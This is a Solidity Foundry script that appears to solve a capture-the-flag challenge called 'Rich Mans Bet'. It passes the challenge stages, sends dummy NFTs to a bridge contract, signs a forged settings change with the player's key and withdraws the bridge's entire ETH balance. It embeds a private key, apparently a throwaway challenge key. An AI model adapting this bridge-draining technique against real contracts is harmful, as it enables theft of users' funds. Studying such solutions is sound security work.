# Rich Mans Bet

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "src/Challenge.sol";
import {Bridge} from "src/Bridge.sol";
import {AdminNFT} from "src/AdminNFT.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

contract Solve is Script {
    using ECDSA for bytes;

    address player;
    uint256 playerPk;
    Challenge challenge;
    Bridge bridge;
    AdminNFT adminNFT;

    function run() external {
        player = 0x9A7C8F0511EA5c0C33F6872Bd11B8F4a74acC834;
        playerPk = 0x08bbf6e49a87c2417409709379d7b1a5fb3a3a0b75ae59e852fc1f6b5fba0544;
        challenge = Challenge(0x3E1572165f2f019A92cFFe51626eb235ab2e75ed);

        vm.startBroadcast();

        bridge = Bridge(challenge.BRIDGE());
        adminNFT = AdminNFT(bridge.adminNftContract());

        challenge.solveStage1(6);
        challenge.solveStage2(101, 59);
        challenge.solveStage3(1, 0, 2);
        bridge.verifyChallenge();

        uint256[] memory dummy = new uint256[](200);
        adminNFT.safeBatchTransferFrom(player, address(bridge), dummy, dummy, "");

        bytes memory message = abi.encode(address(challenge), address(adminNFT), uint256(1<<96));
        bytes[] memory signatures = new bytes[](1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, message.toEthSignedMessageHash());
        signatures[0] = abi.encodePacked(r, s, v);

        bytes[] memory dummy2 = new bytes[](0);
        bridge.changeBridgeSettings(message, signatures);
        bridge.withdrawEth(bytes32(0), dummy2, player, address(bridge).balance, "");

        require(challenge.isSolved(), "Not Solved");

        vm.stopBroadcast();
    }
}
```
